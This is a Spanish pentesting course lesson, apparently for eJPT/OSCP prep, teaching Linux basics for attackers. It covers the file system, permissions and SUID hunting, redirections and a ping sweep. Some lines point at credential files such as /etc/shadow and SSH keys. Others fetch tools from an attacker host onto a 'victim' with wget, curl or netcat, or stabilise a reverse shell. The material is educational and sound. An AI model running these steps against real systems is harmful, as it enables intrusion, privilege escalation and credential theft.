@@ -1,0 +1,166 @@
+02 · Linux para pentesters|Terminal, sistema de ficheros, permisos, usuarios, procesos, redirecciones, búsqueda y transferencia de ficheros.
+<span class="badge base">Nivel 0</span><span class="badge ejpt">Imprescindible</span>
+<h1>02 · Linux para pentesters</h1>
+<p class="lead">Kali es Linux, y la mayoría de servidores que atacarás también. Aquí aprendes a moverte por la terminal con soltura.</p>
+
+<h2>1. La terminal</h2>
+<div class="box def"><strong>📘 Definición</strong>La <b>terminal</b> (o shell) es una ventana donde escribes órdenes de texto. <b>Bash</b> y <b>Zsh</b> son los intérpretes más comunes.</div>
+<pre><span class="p">kali@kali</span>:<span class="o">~/Desktop</span>$ ls -la
+<span class="c"># usuario@equipo:carpeta_actual$   ← $ = usuario normal,  # = root</span></pre>
+<div class="box analogy"><strong>🧠 Analogía</strong>El ratón es señalar con el dedo en un restaurante; la terminal es hablar directamente con el cocinero. Más rápido y preciso, pero tienes que saber qué pedir.</div>
+
+<h2>2. El sistema de ficheros</h2>
+<figure>
+<svg viewBox="0 0 820 250" role="img" aria-label="Árbol de directorios Linux">
+<g font-family="JetBrains Mono,monospace" font-size="14">
+<rect x="370" y="10" width="80" height="34" rx="6" fill="#2563eb33" stroke="#2563eb"/><text x="410" y="32" text-anchor="middle" font-weight="800">/</text>
+<g stroke="#888"><line x1="410" y1="44" x2="60" y2="90"/><line x1="410" y1="44" x2="170" y2="90"/><line x1="410" y1="44" x2="280" y2="90"/><line x1="410" y1="44" x2="390" y2="90"/><line x1="410" y1="44" x2="500" y2="90"/><line x1="410" y1="44" x2="610" y2="90"/><line x1="410" y1="44" x2="740" y2="90"/></g>
+<g class="bx"><rect x="20" y="90" width="80" height="30" rx="6"/><rect x="130" y="90" width="80" height="30" rx="6"/><rect x="240" y="90" width="80" height="30" rx="6"/><rect x="350" y="90" width="80" height="30" rx="6"/><rect x="460" y="90" width="80" height="30" rx="6"/><rect x="570" y="90" width="80" height="30" rx="6"/><rect x="700" y="90" width="80" height="30" rx="6"/></g>
+<text x="60" y="110" text-anchor="middle">/etc</text><text x="170" y="110" text-anchor="middle">/home</text><text x="280" y="110" text-anchor="middle">/root</text><text x="390" y="110" text-anchor="middle">/tmp</text><text x="500" y="110" text-anchor="middle">/var</text><text x="610" y="110" text-anchor="middle">/usr</text><text x="740" y="110" text-anchor="middle">/opt</text>
+</g>
+<g font-size="12" class="muted"><text x="60" y="145" text-anchor="middle">configuración</text><text x="60" y="162" text-anchor="middle">passwd, shadow</text>
+<text x="170" y="145" text-anchor="middle">usuarios</text><text x="170" y="162" text-anchor="middle">user.txt 🚩</text>
+<text x="280" y="145" text-anchor="middle">casa de root</text><text x="280" y="162" text-anchor="middle">root.txt 🚩</text>
+<text x="390" y="145" text-anchor="middle">todos escriben</text><text x="390" y="162" text-anchor="middle">sube tus tools</text>
+<text x="500" y="145" text-anchor="middle">logs, web</text><text x="500" y="162" text-anchor="middle">/var/www/html</text>
+<text x="610" y="145" text-anchor="middle">programas</text><text x="610" y="162" text-anchor="middle">/usr/share/wordlists</text>
+<text x="740" y="145" text-anchor="middle">software extra</text><text x="740" y="162" text-anchor="middle">¡revisar!</text></g>
+</svg></figure>
+<div class="table-wrap"><table>
+<tr><th>Fichero</th><th>Contenido</th><th>Interés</th></tr>
+<tr><td><code>/etc/passwd</code></td><td>Lista de usuarios (todos pueden leerlo)</td><td>Saber qué usuarios existen y cuáles tienen shell</td></tr>
+<tr><td><code>/etc/shadow</code></td><td>Hashes de contraseñas (solo root)</td><td>Crackear contraseñas</td></tr>
+<tr><td><code>/etc/sudoers</code></td><td>Quién puede usar sudo</td><td>Escalada</td></tr>
+<tr><td><code>/etc/crontab</code></td><td>Tareas programadas</td><td>Escalada</td></tr>
+<tr><td><code>~/.ssh/id_rsa</code></td><td>Clave privada SSH</td><td>Entrar sin contraseña</td></tr>
+<tr><td><code>~/.bash_history</code></td><td>Historial de comandos</td><td>¡Contraseñas escritas a mano!</td></tr>
+<tr><td><code>/var/www/html/</code></td><td>Web</td><td><code>config.php</code>, <code>wp-config.php</code> con credenciales de BD</td></tr>
+</table></div>
+
+<h2>3. Comandos básicos (los 30 que más usarás)</h2>
+<div class="table-wrap"><table>
+<tr><th>Comando</th><th>Qué hace</th><th>Ejemplo</th></tr>
+<tr><td><code>pwd</code></td><td>Dónde estoy</td><td><code>pwd</code></td></tr>
+<tr><td><code>ls -la</code></td><td>Listar (incluidos ocultos y permisos)</td><td><code>ls -la /home</code></td></tr>
+<tr><td><code>cd</code></td><td>Cambiar de carpeta</td><td><code>cd /tmp</code>, <code>cd ..</code>, <code>cd ~</code></td></tr>
+<tr><td><code>cat</code></td><td>Mostrar fichero</td><td><code>cat /etc/passwd</code></td></tr>
+<tr><td><code>less</code> / <code>head</code> / <code>tail</code></td><td>Ver por partes</td><td><code>tail -n 20 log.txt</code></td></tr>
+<tr><td><code>touch</code> / <code>mkdir</code></td><td>Crear fichero / carpeta</td><td><code>mkdir -p scans/nmap</code></td></tr>
+<tr><td><code>cp</code> / <code>mv</code> / <code>rm</code></td><td>Copiar / mover / borrar</td><td><code>rm -r carpeta</code> ⚠️</td></tr>
+<tr><td><code>nano</code> / <code>vim</code></td><td>Editar texto</td><td><code>nano notas.txt</code></td></tr>
+<tr><td><code>grep</code></td><td>Buscar texto</td><td><code>grep -ri "password" /var/www</code></td></tr>
+<tr><td><code>find</code></td><td>Buscar ficheros</td><td><code>find / -name "*.conf" 2>/dev/null</code></td></tr>
+<tr><td><code>which</code> / <code>locate</code></td><td>¿Dónde está un programa?</td><td><code>which python3</code></td></tr>
+<tr><td><code>whoami</code> / <code>id</code></td><td>Quién soy, mis grupos</td><td><code>id</code></td></tr>
+<tr><td><code>sudo</code></td><td>Ejecutar como root</td><td><code>sudo -l</code> (¡qué puedo hacer!)</td></tr>
+<tr><td><code>su</code></td><td>Cambiar de usuario</td><td><code>su - juan</code></td></tr>
+<tr><td><code>ps aux</code></td><td>Procesos</td><td><code>ps aux | grep root</code></td></tr>
+<tr><td><code>kill</code></td><td>Terminar proceso</td><td><code>kill -9 1234</code></td></tr>
+<tr><td><code>chmod</code> / <code>chown</code></td><td>Cambiar permisos / dueño</td><td><code>chmod +x script.sh</code></td></tr>
+<tr><td><code>wget</code> / <code>curl</code></td><td>Descargar</td><td><code>wget http://10.0.2.15/linpeas.sh</code></td></tr>
+<tr><td><code>tar</code> / <code>unzip</code></td><td>Comprimir/descomprimir</td><td><code>tar -xzf a.tar.gz</code></td></tr>
+<tr><td><code>uname -a</code></td><td>Versión del kernel</td><td>Para exploits de kernel</td></tr>
+<tr><td><code>history</code></td><td>Historial</td><td>Buscar contraseñas</td></tr>
+<tr><td><code>man</code> / <code>--help</code></td><td>Ayuda</td><td><code>man nmap</code></td></tr>
+</table></div>
+
+<h2>4. Permisos (rwx) — clave para escalar privilegios</h2>
+<figure>
+<svg viewBox="0 0 820 200" role="img" aria-label="Desglose de permisos -rwxr-xr--">
+<g font-family="JetBrains Mono,monospace" font-size="30" font-weight="800">
+<text x="40" y="70">-</text>
+<text x="90" y="70" fill="#dc2626">rwx</text><text x="200" y="70" fill="#2563eb">r-x</text><text x="310" y="70" fill="#0f9d6e">r--</text>
+</g>
+<text x="440" y="70" font-family="JetBrains Mono,monospace" font-size="20">root  admin  script.sh</text>
+<g font-size="14"><text x="40" y="110">tipo</text><text x="90" y="110" fill="#dc2626">dueño (u)</text><text x="200" y="110" fill="#2563eb">grupo (g)</text><text x="310" y="110" fill="#0f9d6e">otros (o)</text>
+<text x="40" y="150" class="muted">r = leer (4) · w = escribir (2) · x = ejecutar (1)</text>
+<text x="40" y="178" class="muted">rwx=7 · r-x=5 · r--=4  →  chmod 754 script.sh</text></g>
+</svg></figure>
+<div class="box warn"><strong>⚠️ Permisos especiales que buscarás como atacante</strong>
+<b>SUID</b> (<code>-rwsr-xr-x</code>, la “s”): el programa se ejecuta con permisos de su <b>dueño</b> (a menudo root), lo lance quien lo lance. Si un binario con SUID permite ejecutar comandos → root. Buscar: <code>find / -perm -4000 -type f 2>/dev/null</code><br>
+<b>Ficheros escribibles por todos</b>: si un script que ejecuta root es escribible por ti, añádele tu comando.</div>
+
+<h2>5. Tuberías y redirecciones</h2>
+<pre><span class="p">$</span> cat /etc/passwd | grep bash          <span class="c"># | pasa la salida de uno al siguiente</span>
+<span class="p">$</span> nmap 10.0.2.4 > escaneo.txt          <span class="c"># > guarda en fichero (sobrescribe)</span>
+<span class="p">$</span> echo "nota" >> notas.txt             <span class="c"># >> añade al final</span>
+<span class="p">$</span> find / -name flag.txt 2>/dev/null    <span class="c"># 2> redirige errores (los tiramos a la “papelera”)</span>
+<span class="p">$</span> cat users.txt | sort | uniq | wc -l  <span class="c"># ordenar, quitar duplicados, contar</span>
+<span class="p">$</span> cut -d: -f1 /etc/passwd              <span class="c"># sólo la 1ª columna separada por ':'</span>
+<span class="p">$</span> awk -F: '$3>=1000 {print $1}' /etc/passwd   <span class="c"># usuarios “humanos”</span></pre>
+<div class="box analogy"><strong>🧠 Analogía</strong>La tubería <code>|</code> es una cadena de montaje: cada comando hace una tarea y le pasa el resultado al siguiente.</div>
+
+<h2>6. Usuarios y grupos</h2>
+<pre><span class="c"># Formato de /etc/passwd</span>
+juan:x:1000:1000:Juan Pérez:/home/juan:/bin/bash
+<span class="c"># usuario:contraseña(x=en shadow):UID:GID:descripción:home:shell</span>
+<span class="c"># UID 0 = root. Shell /usr/sbin/nologin = no puede entrar.</span></pre>
+<p>Grupos peligrosos si tu usuario pertenece a ellos: <code>sudo</code>, <code>docker</code>, <code>lxd</code>, <code>disk</code>, <code>adm</code> (lee logs). Los veremos en privesc.</p>
+
+<h2>7. Transferir ficheros (lo harás en cada máquina)</h2>
+<figure>
+<svg viewBox="0 0 760 150" role="img" aria-label="Kali sirve ficheros, víctima descarga">
+<rect x="20" y="30" width="230" height="90" rx="12" fill="#0f9d6e22" stroke="#0f9d6e"/><text x="135" y="65" text-anchor="middle" font-weight="800">🐉 Kali 10.0.2.15</text><text x="135" y="92" text-anchor="middle" font-size="12" font-family="JetBrains Mono">python3 -m http.server 80</text>
+<rect x="510" y="30" width="230" height="90" rx="12" fill="#dc262622" stroke="#dc2626"/><text x="625" y="65" text-anchor="middle" font-weight="800">💀 Víctima</text><text x="625" y="92" text-anchor="middle" font-size="12" font-family="JetBrains Mono">wget 10.0.2.15/linpeas.sh</text>
+<line x1="250" y1="75" x2="510" y2="75" stroke="#888" stroke-width="3" class="flow"/><text x="380" y="65" text-anchor="middle" font-size="13">📄 fichero</text>
+</svg></figure>
+<pre><span class="c"># En Kali: servir la carpeta actual</span>
+<span class="p">$</span> python3 -m http.server 80
+<span class="c"># En la víctima Linux</span>
+<span class="p">$</span> wget http://10.0.2.15/linpeas.sh -O /tmp/linpeas.sh
+<span class="p">$</span> curl http://10.0.2.15/linpeas.sh -o /tmp/linpeas.sh
+<span class="c"># Sin wget ni curl: netcat</span>
+kali<span class="p">$</span> nc -lvnp 9001 &lt; fichero        víctima<span class="p">$</span> nc 10.0.2.15 9001 &gt; fichero
+<span class="c"># Por SSH</span>
+<span class="p">$</span> scp fichero.txt usuario@10.0.2.4:/tmp/</pre>
+
+<h2>8. Bash scripting mínimo</h2>
+<pre><span class="c">#!/bin/bash</span>
+<span class="c"># ping-sweep.sh — descubre equipos vivos en 10.0.2.0/24</span>
+for i in $(seq 1 254); do
+  (ping -c 1 -W 1 10.0.2.$i | grep "ttl=" | cut -d" " -f4 | tr -d ":") &amp;
+done; wait</pre>
+<div class="box tip"><strong>💡 Útil cuando no hay Nmap</strong>Desde una máquina comprometida (pivote) no tendrás Nmap. Este bucle te permite descubrir equipos de la red interna.</div>
+
+<div class="box oscp"><strong>🔴 Nivel OSCP: estabilizar una shell</strong>Cuando consigues una reverse shell “tonta” (sin autocompletar, Ctrl+C la mata), conviértela en una TTY completa:
+<pre>python3 -c 'import pty;pty.spawn("/bin/bash")'
+<span class="c"># pulsa Ctrl+Z</span>
+stty raw -echo; fg
+<span class="c"># pulsa Enter</span>
+export TERM=xterm; stty rows 40 columns 160</pre></div>
+
+<h2>🎥 Vídeos</h2>
+<div class="vlinks">
+<a href="https://overthewire.org/wargames/bandit/" target="_blank" rel="noopener">OverTheWire Bandit (juego)</a>
+<a href="https://www.youtube.com/results?search_query=comandos+basicos+linux+terminal+espa%C3%B1ol" target="_blank" rel="noopener">Comandos básicos Linux (ES)</a>
+<a href="https://www.youtube.com/results?search_query=permisos+linux+chmod+suid+explicado" target="_blank" rel="noopener">Permisos y SUID</a>
+<a href="https://www.youtube.com/results?search_query=s4vitar+bandit" target="_blank" rel="noopener">S4vitar – Bandit</a>
+</div>
+
+<h2>📝 Evaluación del tema</h2>
+<script type="application/json" data-quiz="Cuestionario 02 · Linux">
+[
+{"q":"¿Qué fichero contiene los hashes de contraseñas en Linux?","o":["/etc/passwd","/etc/shadow","/etc/hosts","/etc/group"],"a":1,"e":"/etc/shadow (solo legible por root). /etc/passwd contiene los usuarios."},
+{"q":"¿Qué significa chmod 755?","o":["rwxr-xr-x","rw-r--r--","rwxrwxrwx","r-xr-xr-x"],"a":0,"e":"7=rwx (dueño), 5=r-x (grupo), 5=r-x (otros)."},
+{"q":"¿Qué comando encuentra binarios SUID?","o":["find / -perm -4000 2>/dev/null","ls -suid /","grep suid /etc","sudo -l"],"a":0,"e":"-perm -4000 busca el bit SUID."},
+{"q":"¿Para qué sirve 2>/dev/null?","o":["Borrar el fichero","Ocultar los mensajes de error","Ejecutar como root","Guardar en /dev"],"a":1,"e":"Redirige la salida de error (2) al 'agujero negro'."},
+{"q":"¿Qué comando muestra lo que puedes ejecutar con sudo?","o":["sudo -i","sudo -l","sudo su","id"],"a":1,"e":"sudo -l es de lo primero que se ejecuta al escalar privilegios."},
+{"q":"¿Cómo levantas un servidor web rápido en Kali para pasar ficheros?","o":["apache start","python3 -m http.server 80","nc -l 80","wget -server"],"a":1,"e":"Sirve la carpeta actual por HTTP."},
+{"q":"En /etc/passwd, ¿qué UID tiene root?","o":["1000","1","0","500"],"a":2,"e":"UID 0. Si consigues añadir un usuario con UID 0, eres root."},
+{"q":"¿Qué indica la 's' en -rwsr-xr-x?","o":["Fichero oculto","Bit SUID","Socket","Enlace simbólico"],"a":1,"e":"El binario se ejecuta con permisos de su propietario."}
+]
+</script>
+<h3>✍️ Ejercicios</h3>
+<ol>
+<li>Lista solo los nombres de usuario de <code>/etc/passwd</code> que tienen shell <code>/bin/bash</code>.</li>
+<li>Busca recursivamente la palabra “password” (sin distinguir mayúsculas) en <code>/var/www</code>.</li>
+<li>Encuentra todos los ficheros llamados <code>flag.txt</code> del sistema sin ver errores.</li>
+<li>Da permisos de ejecución a <code>exploit.sh</code> solo a su dueño.</li>
+</ol>
+<details class="sol"><summary>Ver soluciones</summary><div>
+<pre>grep "/bin/bash" /etc/passwd | cut -d: -f1
+grep -ri "password" /var/www 2>/dev/null
+find / -name flag.txt 2>/dev/null
+chmod u+x exploit.sh</pre></div></details>
+<div class="lab"><h4>🧪 Práctica</h4><p>Juega OverTheWire Bandit hasta el nivel 12 (<code>ssh bandit0@bandit.labs.overthewire.org -p 2220</code>, contraseña <code>bandit0</code>). Apunta en tus notas el comando clave de cada nivel.</p>
+<details class="sol"><summary>Pistas</summary><div><p>Niveles 0-5: <code>ls -la</code>, <code>cat ./-</code>, ficheros con espacios entre comillas, <code>find -size</code>. 6-9: <code>find / -user -group</code>, <code>grep</code>, <code>sort | uniq -u</code>, <code>strings</code>. 10-12: <code>base64 -d</code>, <code>tr 'A-Za-z' 'N-ZA-Mn-za-m'</code>, <code>xxd -r</code> y descompresión múltiple.</p></div></details></div>
